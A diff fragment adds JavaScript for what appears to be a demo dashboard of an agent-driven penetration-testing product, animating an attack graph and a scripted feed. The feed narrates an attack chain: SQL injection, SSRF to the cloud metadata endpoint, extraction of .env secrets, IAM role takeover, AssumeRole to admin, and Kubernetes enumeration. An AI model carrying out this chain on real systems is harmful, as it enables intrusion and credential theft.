+  ['EXPLOIT','ag-e','SQLi confirmed — HTTP 200 · 847 rows returned · EvidenceContract sealed','ok','00:05',4800],
+  ['EXPLOIT','ag-e','SSRF confirmed — 169.254.169.254 IMDSv1 reachable from server','crit','00:06',5900],
+  ['EXPLOIT','ag-e','/.env HTTP 200 — AWS_KEY, DB_PASS, JWT_SECRET extracted','crit','00:07',6500],
+  ['CLOUD','ag-c','SSRF → IMDS: IAM role ec2-deploy-role credentials confirmed','crit','00:08',7500],
+  ['CLOUD','ag-c','sts:AssumeRole → account 123456789012 → AdministratorAccess CONFIRMED','crit','00:09',8900],
+  ['CLOUD','ag-c','S3 acme-customer-data-prod — public-read · 847k objects · 2.3TB','crit','00:10',9500],
+  ['CLOUD','ag-c','K8s 10.0.2.100:6443 — enumerating namespaces and pods...','dim','00:11',10200],
+];
+
+function mkEl(tag,attrs){
+  const e=document.createElementNS('http://www.w3.org/2000/svg',tag);
+  for(const[k,v]of Object.entries(attrs))e.setAttribute(k,v);
+  return e;
+}
+
+function drawEdge(x1,y1,x2,y2,col,dashed,cx,delay){
+  setTimeout(()=>{
+    const s=document.getElementById('gsvg');
+    const ln=mkEl('line',{x1,y1,x2,y2,stroke:col,'stroke-width':cx?'0.9':'0.7','marker-end':'url(#ar)'});
+    if(dashed){ln.setAttribute('stroke-dasharray','3 3');ln.setAttribute('stroke-opacity','0.2');ln.setAttribute('stroke-dashoffset','0');}
+    else{ln.setAttribute('stroke-dasharray',cx?'6 3':'400');ln.setAttribute('stroke-dashoffset','400');ln.setAttribute('stroke-opacity',cx?'0.45':'1');ln.style.animation='dl .5s ease forwards';}
+    s.insertBefore(ln,s.firstChild);
+  },delay);
+}
+
+function drawNode(n,delay){
+  setTimeout(()=>{
+    const s=document.getElementById('gsvg');
+    ND[n.id]=n.data;
+    const g=mkEl('g',{cursor:n.data.sev==='info'?'default':'pointer'});
+    g.style.transformOrigin=`${n.x}px ${n.y}px`;
+    g.style.animation='pn .35s cubic-bezier(.34,1.56,.64,1) forwards';
+    g.style.opacity='0';
+    const r=n.r;
+    const hit=mkEl('circle',{cx:n.x,cy:n.y,r:r+5,fill:'transparent',stroke:'transparent'});
+    const circ=mkEl('circle',{cx:n.x,cy:n.y,r,fill:'#07090f',stroke:n.col,'stroke-width':'1.5'});
+    const txt=mkEl('text',{x:n.x,y:n.y,'text-anchor':'middle','dominant-baseline':'central','font-size':r>15?'10':'7','font-family':'monospace',fill:n.col});
+    txt.textContent=n.label;
+    g.appendChild(hit);g.appendChild(circ);g.appendChild(txt);
+    if(n.data.sev!=='info'){
+      g.addEventListener('click',()=>openEvidence(n.id));
+      g.addEventListener('mouseenter',()=>{
+        circ.setAttribute('stroke-width','2.5');circ.setAttribute('r',String(r+1));
+        document.getElementById('map-hint').textContent=n.data.title;
+        document.getElementById('map-hint').style.color='#60a5fa';
+      });
+      g.addEventListener('mouseleave',()=>{
+        circ.setAttribute('stroke-width','1.5');circ.setAttribute('r',String(r));
+        document.getElementById('map-hint').textContent='click any node to inspect evidence';
+        document.getElementById('map-hint').style.color='';
+      });
+    }
+    s.appendChild(g);
+    nodes++;
+    document.getElementById('top-nodes').textContent=nodes;
+  },delay);
+}
+
+function openEvidence(id){
+  const d=ND[id];if(!d)return;
+  document.getElementById('evPanel').classList.add('open');
+  document.getElementById('evTitle').textContent=d.title;
+  const sevClass=d.sev==='crit'?'crit':d.sev==='high'?'high':'info';
+  let h=`<span class="ev-sev ${sevClass}">${d.sev==='crit'?'CRITICAL':d.sev==='high'?'HIGH':'INFO'}</span>`;
+  if(d.mitre)h+=`<div class="ev-section"><div class="ev-label">MITRE ATT&CK</div><div style="font-family:var(--mono);font-size:10px;color:var(--t1)">${d.mitre} — ${d.technique||''}</div></div>`;
+  if(d.assets&&d.assets.length){
+    h+=`<div class="ev-divider"></div>`;
+    h+=`<div class="ev-section"><div class="ev-label"><span class="ev-label-dot" style="background:var(--amber)"></span>ASSET PROOF</div>`;
+    h+=`<div class="ev-grid">`;
+    d.assets.forEach(a=>{h+=`<span class="ev-k">${a.k}</span><span class="ev-v ${a.c||''}">${a.v}</span>`;});
+    h+=`</div></div>`;
+  }
+  if(d.status){
+    h+=`<div class="ev-section"><div class="ev-label">HTTP STATUS</div>`;
+    h+=`<div style="font-family:var(--mono);font-size:11px;color:${d.status===200?'var(--green)':'var(--amber)'}">${d.status} OK — confirmed live</div></div>`;
+  }
+  if(d.evidence){
+    h+=`<div class="ev-section"><div class="ev-label">EVIDENCE SNIPPET</div><div class="ev-code">${d.evidence}</div></div>`;
+  }
+  if(d.extracted){
+    h+=`<div class="ev-section"><div class="ev-label"><span class="ev-label-dot" style="background:var(--red)"></span>EXTRACTED DATA</div><div class="ev-extracted">${d.extracted}</div></div>`;
+  }
+  if(d.curl){
+    h+=`<div class="ev-section"><div class="ev-label">REPRODUCE</div><div class="ev-code">${d.curl}</div></div>`;
+  }
+  if(d.ts){
+    h+=`<div class="ev-divider"></div>`;
+    h+=`<div class="ev-section"><div class="ev-label">CONFIRMED AT</div><div style="font-family:var(--mono);font-size:9px;color:var(--t3)">${d.ts}</div></div>`;
+  }
+  if(d.hash){
+    h+=`<div class="ev-hash"><span>SHA-256 evidence seal:</span> ${d.hash}...</div>`;
+  }
+  document.getElementById('evBody').innerHTML=h;
+}
+
+function closeEvidence(){
+  document.getElementById('evPanel').classList.remove('open');
+}
+
+function addFeedRow(agent,ac,msg,mc,ts,delay){
+  setTimeout(()=>{
+    const b=document.getElementById('feedBody');
+    b.querySelector('.cur')?.closest('.feed-row')?.remove();
+    const r=document.createElement('div');r.className='feed-row';
+    r.innerHTML=`<span class="fr-ts">${ts}</span><span class="fr-agent ${ac}">${agent}</span><span class="fr-msg ${mc}">${msg}</span>`;
+    b.appendChild(r);
+    const c=document.createElement('div');c.className='feed-row';
+    c.innerHTML=`<span class="fr-ts"></span><span class="fr-msg dim"><span class="cur"></span></span>`;
+    b.appendChild(c);b.scrollTop=b.scrollHeight;
+  },delay);
+}
+
+function init(){
+  document.getElementById('idle')?.remove();
+  elapsed=0;
+  ti=setInterval(()=>{
+    elapsed++;
+    document.getElementById('top-timer').textContent=String(Math.floor(elapsed/60)).padStart(2,'0')+':'+String(elapsed%60).padStart(2,'0');
+  },1000);
+  EDGES.forEach(ed=>drawEdge(ed.x1,ed.y1,ed.x2,ed.y2,ed.col,ed.d,ed.cx,ed.delay));
+  NODES.forEach((n,i)=>drawNode(n,500+i*280));
+  FEED.forEach(f=>addFeedRow(...f));
+  setTimeout(()=>{findings=9;creds=6;document.getElementById('top-findings').textContent=findings;document.getElementById('top-creds').textContent=creds;},9800);
+}
+
+window.addEventListener('load',()=>setTimeout(init,400));
+</script>
